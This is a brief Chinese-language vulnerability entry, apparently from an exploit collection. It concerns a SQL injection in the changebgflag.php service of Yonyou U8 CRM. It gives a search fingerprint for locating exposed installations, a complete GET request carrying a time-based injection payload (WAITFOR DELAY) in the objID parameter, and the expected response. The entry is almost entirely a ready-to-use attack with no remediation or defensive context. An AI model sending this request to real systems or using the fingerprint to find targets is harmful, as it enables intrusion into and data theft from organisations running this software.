# 用友U8CRMchangebgflag存在SQLl注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`app="用友U8CRM"`
- **请求**：`GET /service/changebgflag.php?UserSessionID=bgsesstimeout-&objType=1&StopBgFlag=1&objID=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27-- HTTP/1.1`
- **响应特征**：200